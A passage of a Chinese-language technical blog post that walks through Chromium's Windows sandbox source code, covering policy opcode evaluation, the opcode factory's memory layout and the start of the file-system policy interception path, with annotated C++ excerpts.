class="keyword">const</span> <span class="keyword">char</span>*&gt;(<span class="keyword">this</span>) + str_delta;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">wchar_t</span>*&gt;(delta);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns true if this opcode is an action opcode without actually</span></span><br><span class="line">  <span class="comment">// evaluating it. Used to do a quick scan forward to the next opcode group.</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">IsAction</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> (OP_ACTION == opcode_id_); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns the opcode type.</span></span><br><span class="line">  <span class="function">OpcodeID <span class="title">GetID</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> opcode_id_; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns the stored options such as kPolNegateEval and others.</span></span><br><span class="line">  <span class="function"><span class="keyword">uint32_t</span> <span class="title">GetOptions</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> options_; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Sets the stored options such as kPolNegateEval.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SetOptions</span><span class="params">(<span class="keyword">uint32_t</span> options)</span> </span>&#123; options_ = options; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns the parameter of the function the opcode concerns.</span></span><br><span class="line">  <span class="function"><span class="keyword">uint16_t</span> <span class="title">GetParameter</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> parameter_; &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">size_t</span> kArgumentCount = <span class="number">4</span>;  <span class="comment">// The number of supported argument.</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">OpcodeArgument</span> &#123;</span></span><br><span class="line">    UINT_PTR mem;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// Better define placement new in the class instead of relying on the</span></span><br><span class="line">  <span class="comment">// global definition which seems to be fubared.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="keyword">size_t</span>, <span class="keyword">void</span>* location)</span> </span>&#123; <span class="keyword">return</span> location; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 真正去评估的函数</span></span><br><span class="line">  <span class="function">EvalResult <span class="title">EvaluateHelper</span><span class="params">(<span class="keyword">const</span> ParameterSet* parameters,</span></span></span><br><span class="line"><span class="function"><span class="params">                            MatchContext* match)</span></span>;</span><br><span class="line">  OpcodeID opcode_id_;</span><br><span class="line">  <span class="keyword">int16_t</span> parameter_;</span><br><span class="line">  <span class="keyword">uint32_t</span> options_;</span><br><span class="line">  OpcodeArgument arguments_[PolicyOpcode::kArgumentCount];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="PolicyOpcode-Evaluate"><a href="#PolicyOpcode-Evaluate" class="headerlink" title="PolicyOpcode::Evaluate()"></a>PolicyOpcode::Evaluate()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/policy_engine_opcodes.cc</span></span><br><span class="line"><span class="comment">//此函数是评估任何操作码的唯一入口。</span></span><br><span class="line"><span class="function">EvalResult <span class="title">PolicyOpcode::Evaluate</span><span class="params">(<span class="keyword">const</span> ParameterSet* call_params,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">size_t</span> param_count,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  MatchContext* match)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!call_params)</span><br><span class="line">    <span class="keyword">return</span> EVAL_ERROR;</span><br><span class="line">  <span class="keyword">const</span> ParameterSet* selected_param = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (parameter_ &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(parameter_) &gt;= param_count) &#123;</span><br><span class="line">      <span class="keyword">return</span> EVAL_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    selected_param = &amp;call_params[parameter_];</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="comment">//selected_param借助parameter_的值找到本次想要处理的ParameterSet</span></span><br><span class="line">  EvalResult result = EvaluateHelper(selected_param, match);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 不管操作码的具体类型是什么，都应用通用选项。</span></span><br><span class="line">  <span class="keyword">if</span> (kPolNone == options_) &#123;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果本PolicyOpcode的标记了kPolNegateEval位，那么就要对结果取反（ERROR不管）</span></span><br><span class="line">  <span class="keyword">if</span> (options_ &amp; kPolNegateEval) &#123;</span><br><span class="line">    <span class="keyword">if</span> (EVAL_TRUE == result) &#123;</span><br><span class="line">      result = EVAL_FALSE;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (EVAL_FALSE == result) &#123;</span><br><span class="line">      result = EVAL_TRUE;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (EVAL_ERROR != result) &#123;</span><br><span class="line">      result = EVAL_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (match) &#123;</span><br><span class="line">      <span class="comment">// 如果标记了kPolClearContext位，那么要对辅助结构MatchContext进行清理工作</span></span><br><span class="line">    <span class="keyword">if</span> (options_ &amp; kPolClearContext)</span><br><span class="line">      match-&gt;Clear();</span><br><span class="line">      <span class="comment">// 如果标记了kPolUseOREval，那么就对辅助结构MatchContext打上标记</span></span><br><span class="line">    <span class="keyword">if</span> (options_ &amp; kPolUseOREval)</span><br><span class="line">      match-&gt;options = kPolUseOREval;<span class="comment">//默认是用AND来裁决，该标记表示用OR</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPCODE_EVAL(op, x, y, z) \</span></span><br><span class="line">  <span class="keyword">case</span> op:                       \</span><br><span class="line">    <span class="keyword">return</span> OpcodeEval&lt;op&gt;(x, y, z)</span><br><span class="line"></span><br><span class="line">EvalResult PolicyOpcode::EvaluateHelper(<span class="keyword">const</span> ParameterSet* parameters,</span><br><span class="line">                                        MatchContext* match) &#123;</span><br><span class="line">  <span class="keyword">switch</span> (opcode_id_) &#123;</span><br><span class="line">    OPCODE_EVAL(OP_ALWAYS_FALSE, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    OPCODE_EVAL(OP_ALWAYS_TRUE, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    OPCODE_EVAL(OP_NUMBER_MATCH, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    OPCODE_EVAL(OP_NUMBER_MATCH_RANGE, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    OPCODE_EVAL(OP_NUMBER_AND_MATCH, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    OPCODE_EVAL(OP_WSTRING_MATCH, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    OPCODE_EVAL(OP_ACTION, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> EVAL_ERROR;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>EvaluateHelper</code> 根据<code>opcode_id_</code>来分类调用<code>OPCODE_EVAL</code>来评估</p><h3 id="OPCODE-EVAL"><a href="#OPCODE-EVAL" class="headerlink" title="OPCODE_EVAL()"></a>OPCODE_EVAL()</h3><p>每个<code>opcodeid</code> 都有其对应的<code>OpcodeEval</code>实现</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/policy_engine_opcodes.cc</span></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line">EvalResult OpcodeEval&lt;OP_ALWAYS_FALSE&gt;(PolicyOpcode* opcode,</span><br><span class="line">                                       <span class="keyword">const</span> ParameterSet* param,</span><br><span class="line">                                       MatchContext* context) &#123;</span><br><span class="line">  <span class="keyword">return</span> EVAL_FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line">EvalResult OpcodeEval&lt;OP_ALWAYS_TRUE&gt;(PolicyOpcode* opcode,</span><br><span class="line">                                      <span class="keyword">const</span> ParameterSet* param,</span><br><span class="line">                                      MatchContext* context) &#123;</span><br><span class="line">  <span class="keyword">return</span> EVAL_TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line">EvalResult OpcodeEval&lt;OP_ACTION&gt;(PolicyOpcode* opcode,</span><br><span class="line">                                 <span class="keyword">const</span> ParameterSet* param,</span><br><span class="line">                                 MatchContext* context) &#123;</span><br><span class="line">  <span class="keyword">int</span> action = <span class="number">0</span>;</span><br><span class="line">  opcode-&gt;GetArgument(<span class="number">0</span>, &amp;action);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">static_cast</span>&lt;EvalResult&gt;(action);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line">EvalResult OpcodeEval&lt;OP_NUMBER_AND_MATCH&gt;(PolicyOpcode* opcode,</span><br><span class="line">                                           <span class="keyword">const</span> ParameterSet* param,</span><br><span class="line">                                           MatchContext* context) &#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> value = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (!param-&gt;Get(&amp;value))</span><br><span class="line">    <span class="keyword">return</span> EVAL_ERROR;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint32_t</span> number = <span class="number">0</span>;</span><br><span class="line">  opcode-&gt;GetArgument(<span class="number">0</span>, &amp;number);</span><br><span class="line">  <span class="keyword">return</span> (number &amp; value) ? EVAL_TRUE : EVAL_FALSE;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如果是 match 类的 ID，其最终就是 opcode内存储的<code>Argument</code>和<code>param</code>的比较，返回 TRUE or FALSE</p><p>如果是 OP_ACTION，则返回其对应的<code>EvalResult</code>，如：askbroker.</p><h2 id="OpcodeFactory"><a href="#OpcodeFactory" class="headerlink" title="OpcodeFactory"></a>OpcodeFactory</h2><p>opcode 的一个工程类，用来make opcode</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/policy_engine_opcodes.h</span></span><br><span class="line"><span class="comment">// Factory通过使用构造函数中给定的内存块创建操作码来工作。 </span></span><br><span class="line"><span class="comment">//操作码本身是从内存的开头（顶部）分配的，而操作码需要的任何字符串都是从内存的结尾（底部）分配的。</span></span><br><span class="line"><span class="comment">// In essence:</span></span><br><span class="line"><span class="comment">//   low address ---&gt; [opcode 1]</span></span><br><span class="line"><span class="comment">//                    [opcode 2]</span></span><br><span class="line"><span class="comment">//                    [opcode 3]</span></span><br><span class="line"><span class="comment">//                    |        | &lt;--- memory_top_</span></span><br><span class="line"><span class="comment">//                    | free   |</span></span><br><span class="line"><span class="comment">//                    |        |</span></span><br><span class="line"><span class="comment">//                    |        | &lt;--- memory_bottom_</span></span><br><span class="line"><span class="comment">//                    [string 1]</span></span><br><span class="line"><span class="comment">//   high address --&gt; [string 2]</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OpcodeFactory</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// memory: 指向创建操作码的内存块的基指针。</span></span><br><span class="line">    <span class="comment">// memory_size: chunk size</span></span><br><span class="line">  OpcodeFactory(<span class="keyword">char</span>* memory, <span class="keyword">size_t</span> memory_size) : memory_top_(memory) &#123;</span><br><span class="line">    memory_bottom_ = &amp;memory_top_[memory_size];</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="comment">// policy:包含创建操作码的原始内存</span></span><br><span class="line">  OpcodeFactory(PolicyBuffer* policy, <span class="keyword">size_t</span> memory_size) &#123;</span><br><span class="line">    memory_top_ = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(&amp;policy-&gt;opcodes[<span class="number">0</span>]);</span><br><span class="line">    memory_bottom_ = &amp;memory_top_[memory_size];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">size_t</span> <span class="title">memory_size</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    DCHECK_GE(memory_bottom_, memory_top_);</span><br><span class="line">    <span class="keyword">return</span> memory_bottom_ - memory_top_;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Creates an OpAlwaysFalse opcode.</span></span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpAlwaysFalse</span><span class="params">(<span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpAlwaysTrue</span><span class="params">(<span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpAction</span><span class="params">(EvalResult action, <span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpNumberMatch</span><span class="params">(<span class="keyword">int16_t</span> selected_param,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">uint32_t</span> match,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpVoidPtrMatch</span><span class="params">(<span class="keyword">int16_t</span> selected_param,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">const</span> <span class="keyword">void</span>* match,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpNumberMatchRange</span><span class="params">(<span class="keyword">int16_t</span> selected_param,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">uint32_t</span> lower_bound,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">uint32_t</span> upper_bound,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpWStringMatch</span><span class="params">(<span class="keyword">int16_t</span> selected_param,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">const</span> <span class="keyword">wchar_t</span>* match_str,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">int</span> start_position,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   StringMatchOptions match_opts,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpNumberAndMatch</span><span class="params">(<span class="keyword">int16_t</span> selected_param,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     <span class="keyword">uint32_t</span> match,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     <span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeBase</span><span class="params">(OpcodeID opcode_id,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="keyword">uint32_t</span> options,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="keyword">int16_t</span> selected_param)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">ptrdiff_t</span> <span class="title">AllocRelative</span><span class="params">(<span class="keyword">void</span>* start, <span class="keyword">const</span> <span class="keyword">wchar_t</span>* str, <span class="keyword">size_t</span> length)</span></span>;</span><br><span class="line">  <span class="keyword">char</span>* memory_top_;</span><br><span class="line">  <span class="keyword">char</span>* memory_bottom_;</span><br><span class="line">  DISALLOW_COPY_AND_ASSIGN(OpcodeFactory);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中比较重要的是<code>MakeBase()</code>，所有的 make，最后都会调用这个函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PolicyOpcode* <span class="title">OpcodeFactory::MakeBase</span><span class="params">(OpcodeID opcode_id,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      <span class="keyword">uint32_t</span> options,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      <span class="keyword">int16_t</span> selected_param)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (memory_size() &lt; <span class="keyword">sizeof</span>(PolicyOpcode))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// opcode从top开始向下占用buffer</span></span><br><span class="line">  PolicyOpcode* opcode = <span class="keyword">new</span> (memory_top_) PolicyOpcode();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill in the standard fields, that every opcode has.</span></span><br><span class="line">  memory_top_ += <span class="keyword">sizeof</span>(PolicyOpcode);</span><br><span class="line">  opcode-&gt;opcode_id_ = opcode_id;<span class="comment">// 标记 opcode type</span></span><br><span class="line">  opcode-&gt;SetOptions(options);<span class="comment">// 标记 opcode options</span></span><br><span class="line">  <span class="comment">// 传入的selected_param表示用于和该PolicyOpcode比较的参数在ParameterSet中是第几个，也就是索引</span></span><br><span class="line">  opcode-&gt;parameter_ = selected_param;</span><br><span class="line">  <span class="keyword">return</span> opcode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Filesystem"><a href="#Filesystem" class="headerlink" title="Filesystem"></a>Filesystem</h1><p>Target在执行5个文件系统相关的API时，会因为Interceptions的部署（该子系统由broker远程部署(service call)）而调用hook函数，hook函数通过SharedMem IPC与broker通信，将调用参数传给broker，broker此后通过dispatcher分发找到对应子系统的dispatcher，子系统dispatcher会匹配调用参数并调用一早便注册好的callback，callback会进行Low-level policy的Evaluate鉴权，并进一步调用low-level policy的业务处理函数，根据鉴权结果来执行API，并在CrossCallResult回执结果。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/filesystem_policy.h</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileSystemPolicy</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// 创建所需的低级策略规则来评估文件 IO 的高级策略规则，尤其是文件打开或创建操作。</span></span><br><span class="line">  <span class="comment">// &#x27;name&#x27; 是文件名或目录名。 “语义”。 </span></span><br><span class="line">  <span class="comment">// &#x27;semantics&#x27; 是打开或创建所需的语义</span></span><br><span class="line">  <span class="comment">//&#x27;policy&#x27; 是将要添加规则的策略生成器。</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">GenerateRules</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>* name,</span></span></span><br><span class="line"><span class="function"><span class="params">                            TargetPolicy::Semantics semantics,</span></span></span><br><span class="line"><span class="function"><span class="params">                            LowLevelPolicy* policy)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add basic file system rules.</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">SetInitialRules</span><span class="params">(LowLevelPolicy* policy)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// IPC 收到 creat file 请求时的操作</span></span><br><span class="line">  <span class="comment">// &#x27;client_info&#x27; :发出请求的目标进程。</span></span><br><span class="line">  <span class="comment">// &#x27;eval_result&#x27; : 要完成的预期策略操作。</span></span><br><span class="line">  <span class="comment">// &#x27;file&#x27; : 目标文件或目录。</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">CreateFileAction</span><span class="params">(EvalResult eval_result,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">const</span> ClientInfo&amp; client_info,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">wstring</span>&amp; file,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">uint32_t</span> attributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">uint32_t</span> desired_access,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">uint32_t</span> file_attributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">uint32_t</span> share_access,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">uint32_t</span> create_disposition,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">uint32_t</span> create_options,</span></span></span><br><span class="line"><span class="function"><span class="params">                               HANDLE* handle,</span></span></span><br><span class="line"><span class="function"><span class="params">                               NTSTATUS* nt_status,</span></span></span><br><span class="line"><span class="function"><span class="params">                               ULONG_PTR* io_information)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// IPC 收到 open file 请求时的操作</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">OpenFileAction</span><span class="params">(EvalResult eval_result,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">const</span> ClientInfo&amp; client_info,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">wstring</span>&amp; file,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">uint32_t</span> attributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">uint32_t</span> desired_access,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">uint32_t</span> share_access,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">uint32_t</span> open_options,</span></span></span><br><span class="line"><span class="function"><span class="params">                             HANDLE* handle,</span></span></span><br><span class="line"><span class="function"><span class="params">                             NTSTATUS* nt_status,</span></span></span><br><span class="line"><span class="function"><span class="params">                             ULONG_PTR* io_information)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// IPC 收到 Query 请求时的操作</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">QueryAttributesFileAction</span><span class="params">(EvalResult eval_result,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        <span class="keyword">const</span> ClientInfo&amp; client_info,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">wstring</span>&amp; file,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        <span class="keyword">uint32_t</span> attributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        FILE_BASIC_INFORMATION* file_info,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        NTSTATUS* nt_status)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// IPC 收到 Query full请求时的操作</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">QueryFullAttributesFileAction</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      EvalResult eval_result,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">const</span> ClientInfo&amp; client_info,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">wstring</span>&amp; 